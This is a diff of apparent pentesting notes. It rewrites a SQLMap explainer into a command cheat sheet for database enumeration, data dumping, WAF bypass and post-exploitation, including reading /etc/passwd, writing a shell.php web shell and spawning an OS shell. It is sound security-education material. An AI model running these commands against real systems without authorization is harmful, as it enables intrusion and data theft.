@@ -1,27 +1,77 @@
-# What is SQLMap ? 
-SQLMap is a powerful open-source penetration testing tool that helps identify and exploit SQL injection vulnerabilities in web applications. If you're new to this, let's break it down:
-## SQL Injection:
-SQL injection is a type of security vulnerability that occurs when an attacker can manipulate an application's SQL query by injecting malicious SQL code. This can happen if the application doesn't properly validate or sanitize user inputs.
-## Purpose of SQLMap:
-SQLMap is designed to automate the process of detecting and exploiting SQL injection vulnerabilities. Its primary goal is to help security professionals and ethical hackers identify weaknesses in web applications, allowing developers to fix them before malicious attackers can exploit them.
-## How SQLMap Works:
-SQLMap works by sending specially crafted SQL queries to the target web application and analyzing the responses for indications of a SQL injection vulnerability. It uses various techniques to infer the underlying database structure and retrieve sensitive information.
-## Key Features:
-- Automatic Detection: SQLMap can automatically detect SQL injection vulnerabilities in a given URL or form.
-- Database Fingerprinting: It tries to identify the type and version of the underlying database (e.g., MySQL, PostgreSQL, Microsoft SQL Server).
-- Dumping Data: SQLMap can extract data from the database, allowing testers to see the potential impact of an exploit.
-- Bypassing WAFs: Some web applications use Web Application Firewalls (WAFs) to protect against SQL injection. SQLMap has features to attempt to bypass these protections.
-## Usage:
-SQLMap is a command-line tool, and its usage might seem a bit intimidating for beginners. It involves specifying a target URL or form and various options to configure its behavior. For example:
+# SQLMap
+
+SQLMap automates finding and exploiting **SQL injection**. It detects the injection type, fingerprints the DBMS, and can enumerate databases, dump data, read/write files, and even get an OS shell - all from the command line. It's the go-to tool once you suspect a parameter is injectable (see [SQL Injection](../Vulnerabilities/SQL%20Injection.md)).
+
+## Install
+
+```bash
+sudo apt install sqlmap        # or: pip install sqlmap
 ```
-sqlmap -u "http://example.com/login" --data "username=test&password=test" --dump
+
+## Basic targeting
+
+```bash
+# GET parameter
+sqlmap -u "http://target.tld/item?id=1"
+
+# POST data
+sqlmap -u "http://target.tld/login" --data "user=a&pass=b"
+
+# Test a specific parameter only
+sqlmap -u "http://target.tld/item?id=1&cat=2" -p id
+
+# From a saved Burp request (easiest - keeps cookies/headers)
+sqlmap -r request.txt
+
+# With auth cookie / headers
+sqlmap -u "..." --cookie="session=abc" --headers="X-API-Key: k"
 ```
-This command tells SQLMap to test the given URL for SQL injection using a POST request with specified form data and to dump the retrieved data if successful.
-## Ethical Use:
 
-It's crucial to use SQLMap responsibly and only on systems you have explicit permission to test. Unauthorized use can lead to legal consequences. Always adhere to ethical hacking guidelines and obtain proper authorization before testing any system.
-## Learning Resources:
+## Enumeration (the usual flow)
 
-If you're interested in learning more about SQLMap, there are various tutorials and documentation available online. Understanding SQL injection basics and web application security concepts is essential for effective and responsible use of SQLMap.
+```bash
+sqlmap -r req.txt --dbs                        # list databases
+sqlmap -r req.txt -D shopdb --tables           # list tables
+sqlmap -r req.txt -D shopdb -T users --columns # list columns
+sqlmap -r req.txt -D shopdb -T users --dump    # dump the table
+sqlmap -r req.txt --dump-all                   # everything (noisy)
+sqlmap -r req.txt --current-user --current-db --is-dba   # context/privs
+```
 
-Remember, ethical hacking tools like SQLMap should only be used for legal and authorized security testing purposes. Always respect the privacy and security of others.
+## Tuning detection
+
+```bash
+sqlmap -r req.txt --level=5 --risk=3   # deeper tests (more payloads)
+sqlmap -r req.txt --technique=BEUSTQ   # B=boolean E=error U=union S=stacked T=time Q=inline
+sqlmap -r req.txt --dbms=mysql         # skip fingerprinting if known
+sqlmap -r req.txt --batch              # non-interactive (accept defaults)
+sqlmap -r req.txt --threads=10         # parallelism
+```
+
+## WAF bypass (tamper scripts)
+
+```bash
+sqlmap -r req.txt --tamper=space2comment,between,charencode --random-agent
+sqlmap --list-tampers          # see all tamper scripts
+```
+
+## Going beyond data (post-exploitation)
+
+```bash
+sqlmap -r req.txt --file-read=/etc/passwd          # read a server file
+sqlmap -r req.txt --file-write=shell.php --file-dest=/var/www/html/shell.php
+sqlmap -r req.txt --os-shell                       # interactive OS shell (if possible)
+sqlmap -r req.txt --sql-shell                      # interactive SQL prompt
+```
+
+## Practical tips
+
+- Prefer `-r request.txt` from Burp - it captures cookies, headers, and method automatically.
+- Start low (`--level 1 --risk 1`), raise only if nothing is found.
+- Use `--batch` for automation, but review results manually.
+- Mark the injection point with `*` in a saved request for custom placement.
+- **Only test systems you're authorized to.** SQLMap is loud and can modify data.
+
+## Resources
+
+- [SQLMap wiki](https://github.com/sqlmapproject/sqlmap/wiki)
